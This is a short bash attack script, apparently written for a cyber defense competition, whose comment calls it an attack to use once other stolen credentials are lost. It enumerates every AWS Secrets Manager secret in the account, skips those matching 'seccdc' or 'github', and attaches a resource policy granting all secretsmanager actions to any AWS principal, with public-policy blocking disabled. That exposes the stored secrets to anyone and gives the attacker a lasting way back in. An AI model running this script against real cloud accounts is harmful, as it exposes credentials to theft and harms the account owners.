#!/bin/bash

#
# This attack is executable once I'm locked out of all the other fooli creds
#
echo -n "$0 " ; date


# Works if I've got access to the account
SECRETS=`aws secretsmanager list-secrets --query SecretList[].ARN --output text`

cat <<EOF > policy.json
{
    "Statement": [{"Action": "secretsmanager:*","Effect": "Allow","Principal": {"AWS": "*"},"Resource": "*"}],
    "Version": "2012-10-17"
}
EOF


for s in $SECRETS ; do
    echo $s | grep seccdc >> /dev/null
    if [ $? -eq 0 ] ; then
        continue
    fi
    echo $s | grep github >> /dev/null
    if [ $? -eq 0 ] ; then
        continue
    fi
	aws secretsmanager put-resource-policy --secret-id $s --resource-policy file://policy.json --no-block-public-policy
done
rm policy.json

